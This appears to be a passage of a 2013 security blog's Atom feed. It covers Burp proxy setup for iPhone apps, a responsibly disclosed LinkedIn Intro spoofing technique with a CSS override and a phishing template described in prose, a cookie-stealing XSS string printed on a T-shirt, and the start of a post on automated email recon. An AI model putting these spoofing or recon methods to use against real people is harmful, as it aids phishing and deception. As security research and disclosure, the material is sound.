    <title type="html"><![CDATA[How to Pentest iPhone Apps with Burp]]></title>
    <link href="http://jordan-wright.github.io/blog/2013/11/07/how-to-pentest-iphone-apps-with-burp/"/>
    <updated>2013-11-07T15:50:00-06:00</updated>
    <id>http://jordan-wright.github.io/blog/2013/11/07/how-to-pentest-iphone-apps-with-burp</id>
    <content type="html"><![CDATA[<p><img src="http://jordan-wright.github.io/images/headers/iphone_burp.png"/></p>

<h3>Introduction</h3>

<p>When looking at the functionality of mobile apps, it&rsquo;s clear that they aren&rsquo;t <em>that</em> different than web applications. They often just serve as a frontend for the data stored on a central backend server or database. As such, if developers aren&rsquo;t careful to protect these apps, many of the <a href="https://www.owasp.org/index.php/Top_10_2013">same vulnerabilities</a> we find in standard web applications (such as injection attacks on unvalidated input) can be exploited by attackers.</p>

<p>This post will show how to setup the iPhone to work with the popular <a href="http://portswigger.net/burp/download.html">Burp Suite</a> so that traffic from apps can be intercepted and tested for vulnerabilities.</p>

<!--more-->


<h3>Getting the CA Certificate from Burp</h3>

<p>First, open up Burp, select the &ldquo;Proxy&rdquo; tab, and select the &ldquo;Options&rdquo; sub-tab. Then, under &ldquo;Proxy-Listeners&rdquo;, highlight the interface and select &ldquo;Edit&rdquo;. Then, open the &ldquo;Certificate&rdquo; sub-tab, and make sure it is set to &ldquo;Generate CA-signed per-host certificate&rdquo;. Since we will install the CA certificate on our iPhone, any certificate signed by Burp will be trusted.</p>

<p><a href="http://jordan-wright.github.io/images/blog/iphone_burp/burp_screen.PNG" target="_blank"><img src="http://jordan-wright.github.io/images/blog/iphone_burp/burp_screen.PNG"/></a>
<a href="http://jordan-wright.github.io/images/blog/iphone_burp/burp_settings.PNG" target="_blank"><img src="http://jordan-wright.github.io/images/blog/iphone_burp/burp_settings.PNG"/></a></p>

<p>Next, open up a desktop browser and set the proxy settings to use Burp. In this example, I&rsquo;ll use Chrome. Change your settings so that the browser uses Burp as shown below (IP address and port may differ).</p>

<p><a href="http://jordan-wright.github.io/images/blog/iphone_burp/pc_proxy_settings.PNG" target="_blank"><img src="http://jordan-wright.github.io/images/blog/iphone_burp/pc_proxy_settings.PNG"/></a></p>

<p>Then, go to a site using HTTPS (ie: <a href="https://www.google.com">google.com</a>. Once the page comes up, click the icon in the left side of the address bar, select the &ldquo;Certificate&rdquo; sub-tab, and make sure that the certificate is signed by &ldquo;PortSwigger CA&rdquo;.</p>

<p><a href="http://jordan-wright.github.io/images/blog/iphone_burp/export_cert.png" target="_blank"><img src="http://jordan-wright.github.io/images/blog/iphone_burp/export_cert.png"/></a></p>

<p>Next, click &ldquo;Certificate Information&rdquo;, and select &ldquo;Certification Path&rdquo; in the window that appears.</p>

<p>Highlight the root <strong>PortSwigger CA certificate</strong> and click &ldquo;View Certificate&rdquo;. Then, open up the &ldquo;Details&rdquo; tab and click &ldquo;Copy to File&rdquo;. Follow the Certificate Export wizard, making sure to save the certificate in DER encoded binary X.509 (.CER) format.</p>

<p><a href="http://jordan-wright.github.io/images/blog/iphone_burp/copy_to_file.PNG" target="_blank"><img src="http://jordan-wright.github.io/images/blog/iphone_burp/copy_to_file.PNG"/></a></p>

<p>Once the certificate has been exported, we need to get it onto the iPhone. You can email it to yourself and open it in the iPhone, but I just chose to start a simple Python web server so that I could browse to the certificate as follows:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>python -m SimpleHTTPServer</span></code></pre></td></tr></table></div></figure>


<p><a href="http://jordan-wright.github.io/images/blog/iphone_burp/safari.PNG" target="_blank"><img src="http://jordan-wright.github.io/images/blog/iphone_burp/safari.PNG"/></a></p>

<p>After opening the certificate link in Safari, the following screen will be presented asking you if you want to install the certificate. Click &ldquo;Install&rdquo;, enter your PIN, and you&rsquo;re all set!</p>

<p><a href="http://jordan-wright.github.io/images/blog/iphone_burp/install_cert.png" target="_blank"><img src="http://jordan-wright.github.io/images/blog/iphone_burp/install_cert.png"/></a>
<a href="http://jordan-wright.github.io/images/blog/iphone_burp/trusted_cert.PNG" target="_blank"><img src="http://jordan-wright.github.io/images/blog/iphone_burp/trusted_cert.PNG"/></a></p>

<h3>Setting the iPhone Proxy Settings</h3>

<p>The last thing you will want to do is to set your iPhone to use the Burp proxy. You can do this by going into your wireless network settings and selecting &ldquo;Manual&rdquo; under &ldquo;HTTP PROXY&rdquo;. Then, just fill in the details!</p>

<p><a href="http://jordan-wright.github.io/images/blog/iphone_burp/ios_proxy_settings.png" target="_blank"><img src="http://jordan-wright.github.io/images/blog/iphone_burp/ios_proxy_settings.png"/></a></p>

<h3>Testing</h3>

<p>You can test to see if this works by navigating to Google in Safari. If you don&rsquo;t receive an error, and you can intercept the request in Burp, then you&rsquo;re all set!</p>

<p><a href="http://jordan-wright.github.io/images/blog/iphone_burp/success.PNG" target="_blank"><img src="http://jordan-wright.github.io/images/blog/iphone_burp/success.PNG"/></a></p>

<p>As always, let me know if you have any questions or comments below!</p>

<p>Jordan (<a href="http://twitter.com/jw_sec">@jw_sec</a>)</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Linkedin's Response to My "Phishing with Intro" Post]]></title>
    <link href="http://jordan-wright.github.io/blog/2013/11/01/linkedins-response-to-my-phishing-with-intro-post/"/>
    <updated>2013-11-01T17:55:00-05:00</updated>
    <id>http://jordan-wright.github.io/blog/2013/11/01/linkedins-response-to-my-phishing-with-intro-post</id>
    <content type="html"><![CDATA[<p><img src="http://jordan-wright.github.io/images/headers/linkedin_gift.png"/></p>

<h3>The Initial Post</h3>

<p>I recently published a <a href="http://jordan-wright.github.io/blog/2013/10/26/phishing-with-linkedins-intro/">blog post</a> which showed a practical attack against Linkedin&rsquo;s Intro. The post reached the front page of <a href="http://news.ycombinator.com">Hacker News</a> (a full writeup of my experience with the &ldquo;Hacker News Effect&rdquo; will be posted soon for those interested), which caused the post to gain quite a bit of publicity and traction. Soon after, I was contacted by Linkedin&rsquo;s security team. This was their response.</p>

<!--more-->


<h3>Linkedin&rsquo;s Response</h3>

<p>I was initially contacted via email by David Cintz, a member of Linkedin&rsquo;s security team, wanting to talk with me about the post. While talking with him on the phone, he made it immediately clear that he didn&rsquo;t call to ask me to take down the post &ndash; &ldquo;Linkedin isn&rsquo;t that kind of company&rdquo;. Instead, he simply wanted to see if I would be willing to provide him with any additional information about the vulnerability so that they could provide the most effective fix as soon as possible.</p>

<p>We stayed in contact via phone and email throughout the day, and a hotfix (see the update at the top of the original post) was released in the early evening. I was asked to verify the fix to make sure that it adequately addressed the vulnerability I found. After verifying the fix, the member of the security team told me that he wanted to thank me for my help. He told me that, while they normally don&rsquo;t reward vulnerabilities disclosed without previously notifying them, he appreciated my help and wanted to send me a small token of thanks.</p>

<h3>I&rsquo;ve Got Mail!</h3>

<p>I received the following package today:</p>

<p><a href="http://jordan-wright.github.io/images/blog/phish_response/gift.png" target="_blank"><img src="http://jordan-wright.github.io/images/blog/phish_response/gift.png"/></a></p>

<p>Here are the contents:</p>

<ul>
<li>T-Shirt

<ul>
<li>Front: &ldquo;in&#8221;FORMANT</li>
<li>Back: &lt;script&gt;alert(document.cookie);&lt;/script&gt;</li>
<li>Side: security@in</li>
</ul>
</li>
<li>Hand-written letter from David</li>
<li>2 Linkedin stickers</li>
<li>Linkedin-branded &ldquo;2 in 1&rdquo; Tumbler</li>
</ul>


<h3>Conclusion</h3>

<p>While I still believe that the security risks of using Intro will always outweigh the benefits of using it, I do think Linkedin&rsquo;s security team handled the situation very well. They approached the problem quickly and professionally, while going above and beyond to show appreciation for my help. I&rsquo;m a fan of giving credit where it&rsquo;s due and, in this case, Linkedin&rsquo;s security team certainly earned it.</p>

<p>Thanks, Linkedin.</p>

<h3>Full Timeline</h3>

<ul>
<li><em>October 27, 2013</em> &ndash; Blog Post Published</li>
<li><em>October 28, 2013 9:53 AM PDT</em> &ndash; Contacted by Linkedin Security Team</li>
<li><em>October 28, 2013 approx. 2:40 PM PDT</em> &ndash; Hotfix released</li>
</ul>


<p>-Jordan (<a href="http://twitter.com/jw_sec">@jw_sec</a>)</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Phishing with Linkedin's Intro]]></title>
    <link href="http://jordan-wright.github.io/blog/2013/10/26/phishing-with-linkedins-intro/"/>
    <updated>2013-10-26T19:21:00-05:00</updated>
    <id>http://jordan-wright.github.io/blog/2013/10/26/phishing-with-linkedins-intro</id>
    <content type="html"><![CDATA[<p><img src="http://jordan-wright.github.io/images/headers/linkedin_phish.png"/></p>

<p><em>Update 10/28/2013 6:30PM CDT &ndash; I have been in contact with Linkedin&rsquo;s security team and a hotfix has recently been released to address the findings below. This fix applies the styling rules to a randomly generated ID, as opposed to the class based styling seen below. This provides more specificity in applying the rules, making it more difficult to override.</em></p>

<p><em>I am no CSS expert so there could very well be tricks to still get around this and remove the content (or even just hide it and overlap it) &ndash; <a href="http://jordan-wright.github.io/contact">email me</a> if you know of one! I will be continuing my work with Linkedin&rsquo;s security team to iron out any bugs we can find. Users are reminded that no solution is perfect, and that seeing this data in an email in no way definitively proves the senders legitimacy.</em></p>

<p><em>I would also like to thank Linkedin&rsquo;s security team for their quick and effective response to these findings.</em></p>

<h3>&ldquo;Intro&#8221;duction</h3>

<p>On October 23, Linkedin introduced an application called <a href="http://blog.linkedin.com/2013/10/23/announcing-linkedin-intro/">&ldquo;Intro&rdquo;</a>. The premise is simple: allow iPhone users to see details about the people they are emailing within the native iPhone Mail App. Think <a href="http://rapportive.com/">Rapportive</a> for the iPhone Mail App, because that&rsquo;s <em>essentially</em> what this is (and made by the same people).</p>

<p>However, when reading the initial description of Intro, there was one part that caught my eye:</p>

<blockquote><p>David says Crosswise would love to work with you. Is this spam, or the real deal?</p>

<p>With Intro, you can immediately see what David looks like, where he’s based, and what he does. You can see that he’s the CEO of Crosswise. This is the real deal.</p></blockquote>

<p>This is not much different than Linkedin saying &ldquo;we&rsquo;ve put a picture of a lock in your email, so you know for sure it&rsquo;s secure&rdquo;. Linkedin is simply giving its users a false sense of security. In this post, we&rsquo;ll take a look and see what <em>exactly</em> Linkedin is doing to its users&#8217; email, as well as how we can spoof this information, gaining full control of the information shown to the user.</p>

<!-- more -->


<h3>What Linkedin Does to Your Email</h3>

<p>While I am currently performing a much more in-depth analysis of Intro which will give a much better look into its behavior (to be posted soon), for now we will just take a look at the basics of how Intro works, and look specifically into how it manipulates user&rsquo;s email.</p>

<p>Intro works by first obtaining an OAuth access token to manage your email. They can get away with not asking for your Gmail password since <a href="https://developers.google.com/gmail/oauth_overview">Google implemented OAuth support into Gmail&rsquo;s IMAP and SMTP</a>. After Linkedin can access your email, they install a security profile onto your iPhone. The most notable feature of this security profile is that it installs a new email account pointing to Linkedin&rsquo;s IMAP and SMTP servers. I&rsquo;m not sure of a way to recover the email account password from the iPhone itself, but by intercepting the profile sent to the iPhone via a proxy, we can see that this email account looks like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class='xml'><span class='line'><span class="nt">&lt;dict&gt;</span>
</span><span class='line'>    <span class="nt">&lt;key&gt;</span>PayloadDisplayName<span class="nt">&lt;/key&gt;&lt;string&gt;</span>Email Settings<span class="nt">&lt;/string&gt;</span>
</span><span class='line'>    <span class="nt">&lt;key&gt;</span>PayloadType<span class="nt">&lt;/key&gt;&lt;string&gt;</span>com.apple.mail.managed<span class="nt">&lt;/string&gt;</span>
</span><span class='line'>    <span class="nt">&lt;key&gt;</span>PayloadVersion<span class="nt">&lt;/key&gt;&lt;integer&gt;</span>1<span class="nt">&lt;/integer&gt;</span>
</span><span class='line'>    <span class="nt">&lt;key&gt;</span>PayloadUUID<span class="nt">&lt;/key&gt;&lt;string&gt;</span>[redacted]<span class="nt">&lt;/string&gt;</span>
</span><span class='line'>    <span class="nt">&lt;key&gt;</span>PayloadIdentifier<span class="nt">&lt;/key&gt;&lt;string&gt;</span>com.rapportive.iphone.settings.email.[redacted]<span class="nt">&lt;/string&gt;</span>
</span><span class='line'>    <span class="nt">&lt;key&gt;</span>EmailAccountName<span class="nt">&lt;/key&gt;&lt;string&gt;</span>Test Account<span class="nt">&lt;/string&gt;</span>
</span><span class='line'>    <span class="nt">&lt;key&gt;</span>EmailAccountType<span class="nt">&lt;/key&gt;&lt;string&gt;</span>EmailTypeIMAP<span class="nt">&lt;/string&gt;</span>
</span><span class='line'>    <span class="nt">&lt;key&gt;</span>EmailAddress<span class="nt">&lt;/key&gt;&lt;string&gt;</span>linkedin.intro.test@gmail.com<span class="nt">&lt;/string&gt;</span>
</span><span class='line'>    <span class="nt">&lt;key&gt;</span>EmailAccountDescription<span class="nt">&lt;/key&gt;&lt;string&gt;</span>Gmail +Intro<span class="nt">&lt;/string&gt;</span>
</span><span class='line'>    <span class="nt">&lt;key&gt;</span>IncomingMailServerAuthentication<span class="nt">&lt;/key&gt;&lt;string&gt;</span>EmailAuthPassword<span class="nt">&lt;/string&gt;</span>
</span><span class='line'>    <span class="nt">&lt;key&gt;</span>IncomingMailServerHostName<span class="nt">&lt;/key&gt;&lt;string&gt;</span>imap.intro.linkedin.com<span class="nt">&lt;/string&gt;</span>
</span><span class='line'>    <span class="nt">&lt;key&gt;</span>IncomingMailServerPortNumber<span class="nt">&lt;/key&gt;&lt;integer&gt;</span>143<span class="nt">&lt;/integer&gt;</span>
</span><span class='line'>    <span class="nt">&lt;key&gt;</span>IncomingMailServerUseSSL<span class="nt">&lt;/key&gt;&lt;true/&gt;</span>
</span><span class='line'>    <span class="nt">&lt;key&gt;</span>IncomingMailServerUsername<span class="nt">&lt;/key&gt;&lt;string&gt;</span>[username_redacted]<span class="nt">&lt;/string&gt;</span>
</span><span class='line'>    <span class="nt">&lt;key&gt;</span>IncomingPassword<span class="nt">&lt;/key&gt;&lt;string&gt;</span>[password_redacted]<span class="nt">&lt;/string&gt;</span>
</span><span class='line'>    <span class="nt">&lt;key&gt;</span>OutgoingPasswordSameAsIncomingPassword<span class="nt">&lt;/key&gt;&lt;true/&gt;</span>
</span><span class='line'>    <span class="nt">&lt;key&gt;</span>OutgoingMailServerAuthentication<span class="nt">&lt;/key&gt;&lt;string&gt;</span>EmailAuthPassword<span class="nt">&lt;/string&gt;</span>
</span><span class='line'>    <span class="nt">&lt;key&gt;</span>OutgoingMailServerHostName<span class="nt">&lt;/key&gt;&lt;string&gt;</span>smtp.intro.linkedin.com<span class="nt">&lt;/string&gt;</span>
</span><span class='line'>    <span class="nt">&lt;key&gt;</span>OutgoingMailServerPortNumber<span class="nt">&lt;/key&gt;&lt;integer&gt;</span>587<span class="nt">&lt;/integer&gt;</span>
</span><span class='line'>    <span class="nt">&lt;key&gt;</span>OutgoingMailServerUseSSL<span class="nt">&lt;/key&gt;&lt;true/&gt;</span>
</span><span class='line'>    <span class="nt">&lt;key&gt;</span>OutgoingMailServerUsername<span class="nt">&lt;/key&gt;&lt;string&gt;</span> Gmail +Intro ?[username_redacted]<span class="nt">&lt;/string&gt;</span>
</span><span class='line'>    <span class="nt">&lt;key&gt;</span>OutgoingPassword<span class="nt">&lt;/key&gt;&lt;string&gt;</span>[password_redacted]<span class="nt">&lt;/string&gt;</span>
</span><span class='line'><span class="nt">&lt;/dict&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>By intercepting the profile, we can get the username and password used to log into Linkedin&rsquo;s IMAP (imap.intro.linkedin.com) and SMTP (smtp.intro.linkedin.com) services. The username was a base64 encoded string, and the password was a 32 character hash.</p>

<p>Here&rsquo;s a diagram of how this works:</p>

<p><a href="http://jordan-wright.github.io/images/blog/intro_phish/diagram.png" target="_blank"><img src="http://jordan-wright.github.io/images/blog/intro_phish/diagram.png"/></a></p>

<p>Now that we have the username and password used for this mail account, let&rsquo;s grab the first email and see what content Linkedin&rsquo;s IMAP proxy injects into it. We can do this with OpenSSL.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='xml'><span class='line'># openssl s_client -connect imap.intro.linkedin.com:143 -starttls imap -crlf -quiet
</span><span class='line'>depth=2 C = US, O = &quot;thawte, Inc.&quot;, OU = Certification Services Division, OU = &quot;(c) 2006 thawte, Inc. - For authorized use only&quot;, CN = thawte Primary Root CA
</span><span class='line'>verify error:num=19:self signed certificate in certificate chain
</span><span class='line'>verify return:0
</span><span class='line'>. OK More capabilities after LOGIN
</span><span class='line'>a LOGIN username_redacted password_redacted
</span><span class='line'>* CAPABILITY IMAP4rev1 IDLE NAMESPACE ID CHILDREN UIDPLUS COMPRESS=DEFLATE
</span><span class='line'>A OK linkedin.intro.test@gmail.com Test Account authenticated (Success)
</span><span class='line'>b SELECT INBOX
</span><span class='line'>* FLAGS (\Answered \Flagged \Draft \Deleted \Seen)
</span><span class='line'>* OK [PERMANENTFLAGS (\Answered \Flagged \Draft \Deleted \Seen \*)] Flags permitted.
</span><span class='line'>* OK [UIDVALIDITY 1] UIDs valid.
</span><span class='line'>* 4 EXISTS
</span><span class='line'>* 0 RECENT
</span><span class='line'>* OK [UIDNEXT 5] Predicted next UID.
</span><span class='line'>* OK [HIGHESTMODSEQ 1049]
</span><span class='line'>b OK [READ-WRITE] INBOX selected. (Success)
</span><span class='line'>c FETCH 4 BODY[]
</span><span class='line'>* 4 FETCH (FLAGS (\Seen) BODY[] {36510}
</span><span class='line'>email_content_here
</span></code></pre></td></tr></table></div></figure>


<p>As it turns out, Linkedin injects quite a bit of content into your email. The basic structure looks like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="cp">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD HTML 4.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/REC-html40/loose.dtd&quot;&gt;</span>
</span><span class='line'><span class="nt">&lt;html&gt;</span>
</span><span class='line'>  <span class="nt">&lt;head&gt;</span>
</span><span class='line'>      <span class="nt">&lt;meta</span> <span class="na">http-equiv=</span><span class="s">&quot;Content-Type&quot;</span> <span class="na">content=</span><span class="s">&quot;text/html; charset=utf-8&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>      User specified CSS (if any)
</span><span class='line'>      <span class="nt">&lt;style </span><span class="na">type=</span><span class="s">&quot;text/css&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>          <span class="c">/*BEGIN RAPPORTIVE*/</span>
</span><span class='line'>          <span class="nt">Injected</span> <span class="nt">Linkedin</span> <span class="nt">Intro</span> <span class="nt">CSS</span>
</span><span class='line'>          <span class="c">/*END RAPPORTIVE*/</span>
</span><span class='line'>      <span class="nt">&lt;/style&gt;</span>
</span><span class='line'>  <span class="nt">&lt;/head&gt;</span>
</span><span class='line'>  <span class="nt">&lt;body&gt;</span>
</span><span class='line'>      <span class="c">&lt;!--BEGIN RAPPORTIVE--&gt;</span>
</span><span class='line'>      Injected Linkedin Intro HTML Content
</span><span class='line'>      <span class="c">&lt;!--END RAPPORTIVE--&gt;</span>
</span><span class='line'>      Original Message
</span><span class='line'>  <span class="nt">&lt;/body&gt;</span>
</span><span class='line'><span class="nt">&lt;/html&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>You can find the full email <a href="https://gist.github.com/jordan-wright/7189765#file-original_email-html">here</a> (some links and what-not have been redacted). Now that we know what Linkedin does to the email, let&rsquo;s see how we can use it to make our phishing emails appear to be legitimate.</p>

<h3>Setting up the Bait</h3>

<p>Just like setting up a spoofed website, we can simply copy the existing CSS and HTML structure provided by Linkedin, and repurpose it for our needs. The first thing we will want to do is to find a way to get rid of the existing Intro data. We can do this by setting the CSS for the existing Intro block to <code>display:none;</code>. Unfortunately for us, Linkedin obviously considered this, since the CSS is usually injected at the end of our <code>head</code> block, and they were pretty specific in ensuring the <code>!important</code> keyword is set for things such as the display, height, etc.</p>

<p>But they weren&rsquo;t specific enough. If we look at the CSS, we can see that the rules apply to the <code>#rapportive.iphone</code> element. If we look closely, we can see that in fact the HTML element we want to hide has a full spec of <code>#rapportive.rapportive.topbar.iphone</code>. Therefore, we can simply set the following style block to hide the element:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='css'><span class='line'><span class="o">&lt;</span><span class="nt">style</span> <span class="nt">type</span><span class="o">=</span><span class="s2">&quot;text/css&quot;</span><span class="o">&gt;</span>
</span><span class='line'>    <span class="nf">#rapportive</span><span class="nc">.rapportive.topbar.iphone</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">display</span><span class="o">:</span><span class="k">none</span> <span class="cp">!important</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="o">&lt;/</span><span class="nt">style</span><span class="o">&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Easy as that.</p>

<p>Now that we have removed the existing Intro data, we are free to inject our own. To do this, we can copy the existing HTML provided by Linkedin. To make sure that our data is not hidden by our previous CSS, we can simply remove the <code>topbar</code> class from the root element, since it will have no effect on styling. The last things we will want to do are to clean up the margins Linkedin puts on the original message, as well as changing the actual data itself to be whatever we want. In addition to this, I copied some of the CSS and HTML and changed the IDs which are generated automatically. This will make sure our template is always consistent.</p>

<h3>Going Phishing</h3>

<p>I&rsquo;ve taken the liberty of setting up a basic PoC <a href="https://gist.github.com/jordan-wright/7189765#file-template-html">template</a> for educational purposes. To use it, just visit the Linkedin profile for the person you are pretexting as, and fill in the CSS information as needed. Ideally, in the future there could be improvements to automatically scrape this information, check to make sure that the Intro data is only shown on mobile devices, etc. For now &ndash; it works. Let&rsquo;s see what it looks like if I spoof the example from Linkedin&rsquo;s original post, David (pardon the non-IOS7 &ndash; I don&rsquo;t see any major IOS7 styling issues which would cause much trouble):</p>

<p><a href="http://jordan-wright.github.io/images/blog/intro_phish/david.png" target="_blank"><img style="display:block; margin:auto;" src="http://jordan-wright.github.io/images/blog/intro_phish/david.png"/></a></p>

<p>Here&rsquo;s what the details look like when I open the Intro tab (they are customizable as well &ndash; I left them as me to show that I really do control the content):</p>

<p><a href="http://jordan-wright.github.io/images/blog/intro_phish/david_details.png" target="_blank"><img style="display:block; margin:auto;" src="http://jordan-wright.github.io/images/blog/intro_phish/david_details.png"/></a></p>

<p>Obviously, this was an extremely benign example. It would be just as easy to attach a malicious payload, request sensitive information, etc.</p>

<h3>Final Thoughts</h3>

<p>While Linkedin Intro <em>seems</em> like it would be useful on the surface &ndash; the security risks of using it are simply too high. With that being said, as a social engineer, <strong><em>I hope my targets use Intro</em></strong>. By giving users a false sense of security when they see the Intro information in an email, Linkedin has made my pretext much stronger and the SE engagement that much easier.</p>

<p>I have yet to get comments setup on the new blog, but <a href="http://jordan-wright.github.io/contact">shoot me an email</a> if you have any questions or comments!</p>

<p>Jordan (<a href="http://twitter.com/jw_sec">@jw_sec</a>)</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Automated Social Engineering Recon Using Rapportive]]></title>
    <link href="http://jordan-wright.github.io/blog/2013/10/14/automated-social-engineering-recon-using-rapportive/"/>
    <updated>2013-10-14T02:55:00-05:00</updated>
    <id>http://jordan-wright.github.io/blog/2013/10/14/automated-social-engineering-recon-using-rapportive</id>
    <content type="html"><![CDATA[<p><img src="http://jordan-wright.github.io/images/headers/rapportive_small.png"/></p>

<h3>Introduction</h3>

<p>When performing a social engineering engagement, recon is key. In a <a href="http://raidersec.blogspot.com/2012/12/automated-open-source-intelligence.html">previous post</a>, I demonstrated a few ways in which we could automate the recon process. However, the methods I showed were simply ways to find the profiles of people that might belong to a particular organization.</p>

<p>During SE engagements, we often either run across email addresses (by, say, simply scraping the main website) or want to enumerate the email address structure in use by an organization (generating possible alternatives using tools like jigsaw.rb). It would be helpful if it were possible to automate the process of validating those email addresses by associating them to additional information or social networking profiles. This is where Rapportive comes in handy.</p>

<!-- more -->


<h3>What is Rapportive?</h3>

<p><a href="http://rapportive.com/">Rapporitve</a>, acquired by Linkedin in February 2012, is an add-on for multiple browsers which embeds information about your contacts directly into Gmail. The extension sends your contact&rsquo;s email address to the Rapportive server, which responds with known public information associated with the email address such as social networking profiles.</p>

<h3>Reverse Engineering the Rapportive Extension</h3>

<p>Let&rsquo;s take a look at how the Rapportive Extension works (disclosure: I&rsquo;m using Chrome). The extension simply consists of a Javascript file called &ldquo;user.js&rdquo;. When we navigate to Gmail, this file will load another JS file called <a href="https://rapportive.com/load/launchpad">&ldquo;launchpad&rdquo;</a>. The launchpad file then fetches the main file called <a href="https://rapportive.com/load/application">&ldquo;application&rdquo;</a>, which implements all the functionality provided by Rapportive. If you want to do a full static analysis of them &ndash; feel free. For this post, we&rsquo;ll take a look at the behavior of the extension, and see if we can automate its functionality.</p>

<p>Here are the requests made when using the extension:</p>

<p><a href="http://jordan-wright.github.io/images/blog/rapportive/burp.png" target="_blank"><img src="http://jordan-wright.github.io/images/blog/rapportive/burp.png"/></a></p>

<p>There are two interesting requests to note. The first one is a call to /immediate_login. This is used to login to Rapportive using Google&rsquo;s <a href="https://developers.google.com/accounts/docs/OpenID">OpenID</a>. The next request to note is to /contacts/email?[target_email]. This is the call made when we open an email from one of our contacts. Here is an example of the data returned (I&rsquo;ve only removed unneccessary data for brevity):</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>{
</span><span class='line'>   "contact":{
</span><span class='line'>      "image_url_raw":"https:\/\/secure.gravatar.com\/avatar\/97754d23d40bbe7dce50f3424991b697?s=80&d=404",
</span><span class='line'>      "raplets":[],
</span><span class='line'>      "memberships":[
</span><span class='line'>         {
</span><span class='line'>            "profile_url":"http:\/\/www.linkedin.com\/pub\/54\/795\/752",
</span><span class='line'>            "view_text":"",
</span><span class='line'>            "site_name":"LinkedIn",
</span><span class='line'>         },
</span><span class='line'>         {
</span><span class='line'>            "display_name":"Blogger",
</span><span class='line'>            "username":null,
</span><span class='line'>            "profile_url":"http:\/\/raidersec.blogspot.com",
</span><span class='line'>            "view_text":"View Jordan's profile on Blogger",
</span><span class='line'>            "site_name":"Blogger",
</span><span class='line'>         },
</span><span class='line'>         {
</span><span class='line'>            "display_name":"GitHub",
</span><span class='line'>            "username":"jordan-wright",
</span><span class='line'>            "profile_id":"jordan-wright",
</span><span class='line'>            "profile_url":"https:\/\/github.com\/jordan-wright",
</span><span class='line'>            "view_text":"View Jordan's profile on GitHub",
</span><span class='line'>            "site_name":"GitHub",
</span><span class='line'>         }
</span><span class='line'>      ],
</span><span class='line'>      "headline":"Jordan Wright - Security Engineer",
</span><span class='line'>      "email":"jmwright798@gmail.com",
